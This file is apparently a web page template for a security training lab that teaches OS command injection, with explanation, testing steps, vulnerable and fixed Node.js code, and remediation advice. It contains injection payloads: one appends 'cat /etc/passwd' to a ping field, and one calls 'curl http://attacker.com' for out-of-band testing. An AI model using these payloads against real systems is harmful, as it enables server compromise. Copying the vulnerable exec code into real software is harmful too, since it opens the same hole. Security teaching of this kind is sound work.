@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title><%= vuln.name %> - Vuln-World</title>
+  <style>
+    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background: #f9fafb; color: #374151; line-height: 1.6; }
+    header { background: #1f2937; color: #fff; padding: 15px 30px; display: flex; align-items: center; justify-content: space-between; }
+    header a { color: #9ca3af; text-decoration: none; font-weight: bold; }
+    header a:hover { color: white; }
+    .container { max-width: 900px; margin: 40px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
+    h1 { margin-top: 0; color: #111827; }
+    h2 { color: #1f2937; border-bottom: 2px solid #e5e7eb; padding-bottom: 10px; margin-top: 40px; text-transform: uppercase; font-size: 18px; letter-spacing: 0.05em; }
+    .badge { display: inline-block; padding: 4px 8px; background: #e5e7eb; border-radius: 12px; font-size: 12px; font-weight: bold; margin-right: 10px; color: #4b5563; }
+    .btn { display: inline-block; padding: 12px 24px; background: #2563eb; color: white; text-decoration: none; border-radius: 6px; font-weight: bold; margin: 20px 0; }
+    .btn:hover { background: #1d4ed8; }
+    pre { background: #1f2937; color: #f8f8f2; padding: 20px; border-radius: 6px; overflow-x: auto; font-family: monospace; font-size: 14px; }
+    .vuln-code { border-left: 4px solid #ef4444; }
+    .sec-code { border-left: 4px solid #10b981; }
+    .diagram { background: #f3f4f6; padding: 20px; font-family: monospace; white-space: pre; border-radius: 6px; border: 1px solid #e5e7eb; overflow-x: auto; font-size: 14px; line-height: 1.5; }
+    ul { padding-left: 20px; }
+    li { margin-bottom: 8px; }
+  </style>
+</head>
+<body>
+  <header>
+    <a href="/vulnerabilities">← Back to Vulnerabilities</a>
+  </header>
+  <div class="container">
+    <h1><%= vuln.name %></h1>
+    <div style="margin-bottom: 30px;">
+      <span class="badge"><%= vuln.category %></span>
+      <span class="badge"><%= vuln.difficulty %></span>
+    </div>
+    
+    <a href="/labs/<%= vuln.lab %>?challenge=<%= vuln.id %>" class="btn">Start Lab (<%= vuln.lab %>)</a>
+    
+    <h2>What Is It?</h2>
+    <p>Command Injection (also known as OS Command Injection) is a vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server running an application. This typically happens when an application passes unsafe user-supplied data to a system shell.</p>
+
+    <h2>In Simple Words</h2>
+    <p>Imagine a robot assistant that takes your requests and passes them exactly to the building's control system. You say "Turn on lights in room 101." But if you say "Turn on lights in room 101 AND unlock the front door," the robot passes the whole sentence, and both actions happen. Command injection exploits the "AND" part.</p>
+
+    <h2>Where Does It Appear?</h2>
+    <ul>
+      <li>Network diagnostic tools (Ping, Traceroute)</li>
+      <li>Image processing apps (passing filenames to ImageMagick)</li>
+      <li>Video/Audio conversion tools</li>
+      <li>Export/Import features relying on OS utilities (like `mysqldump`)</li>
+    </ul>
+
+    <h2>How Does It Occur?</h2>
+    <div class="diagram">
+Input: 127.0.0.1; whoami
+
+[App Code] exec("ping " + input)
+   |
+   v
+[OS Shell] Executes: ping 127.0.0.1; whoami
+   |
+   v
+(Outputs ping results followed by the username)
+    </div>
+
+    <h2>HTTP Example</h2>
+    <pre>
+POST /diagnostic HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+
+target=127.0.0.1; cat /etc/passwd
+    </pre>
+
+    <h2>Burp Suite Investigation</h2>
+    <ol>
+      <li>Find inputs that likely interact with the underlying OS.</li>
+      <li>Use Burp Repeater to append shell metacharacters like <code>;</code>, <code>|</code>, <code>&&</code>, or <code>||</code> to the input.</li>
+      <li>Follow it with a safe command like <code>whoami</code> or <code>sleep 10</code>.</li>
+      <li>Check the response for the command output or monitor the response time (for blind injection).</li>
+    </ol>
+
+    <h2>How Developers Accidentally Create It</h2>
+    <p>Vulnerable Code:</p>
+    <pre class="vuln-code">
+const { exec } = require('child_process');
+
+app.post('/ping', (req, res) => {
+  const target = req.body.target;
+  // Directly inserting user input into a shell command
+  exec('ping -c 4 ' + target, (err, stdout, stderr) => {
+    res.send(stdout);
+  });
+});
+    </pre>
+    <p>Secure Code:</p>
+    <pre class="sec-code">
+const { execFile } = require('child_process');
+
+app.post('/ping', (req, res) => {
+  const target = req.body.target;
+  // Use execFile which does not spawn a shell, or use child_process.spawn
+  execFile('ping', ['-c', '4', target], (err, stdout, stderr) => {
+    res.send(stdout);
+  });
+});
+    </pre>
+
+    <h2>Impact</h2>
+    <ul>
+      <li>Full system compromise (Remote Code Execution).</li>
+      <li>Data exfiltration and destruction.</li>
+      <li>Pivoting to attack other internal network resources.</li>
+    </ul>
+
+    <h2>How to Find It in Real Applications</h2>
+    <ul>
+      <li>Test with various separators: `;`, `|`, `&`, `\n`.</li>
+      <li>Test blind injection by using time delays (e.g., `ping -c 10 127.0.0.1` or `sleep 10`).</li>
+      <li>Test out-of-band injection using Burp Collaborator (e.g., `curl http://attacker.com`).</li>
+    </ul>
+
+    <h2>Remediation</h2>
+    <p>Never pass unsanitized user input directly to a system shell. Use language-specific APIs instead of OS commands whenever possible (e.g., use a network library instead of the `ping` command). If OS commands are necessary, use functions that do not spawn a shell (like `execFile` in Node.js) and pass arguments as an array rather than a single concatenated string.</p>
+
+    <h2>Secure Design Checklist</h2>
+    <ul>
+      <li>Avoid calling OS commands directly.</li>
+      <li>Use parameterized execution methods (no shell interpretation).</li>
+      <li>Strictly validate and sanitize input against an allowlist.</li>
+    </ul>
+
+    <h2>Lab Investigation Guide</h2>
+    <p>In this lab, there's a diagnostic tool that pings a provided target. What happens if you try to execute multiple commands at once using shell operators? Try reading the secret file you discovered earlier using this tool.</p>
+
+    <h2>Post-Lab Explanation</h2>
+    <p>The application concatenated your input directly into a shell command. By using a separator like `;` or `&&`, you tricked the shell into finishing the `ping` command and executing a second command of your choice (like `cat secret.txt`), allowing you to read arbitrary files and execute code on the server.</p>
+  </div>
+</body>
+</html>
